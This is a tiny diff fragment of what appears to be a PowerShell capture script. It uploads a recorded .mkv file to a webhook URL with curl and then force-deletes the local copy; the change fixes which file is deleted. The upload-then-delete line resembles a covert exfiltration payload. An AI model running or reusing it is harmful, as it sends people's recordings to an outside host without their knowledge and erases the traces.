@@ -44,7 +44,7 @@ if ($t.Length -eq 0){$t = 10}
 
 curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
 sleep 1
-rm -Path $mp3Path -Force
+rm -Path $mkvPath -Force
 
 }
 
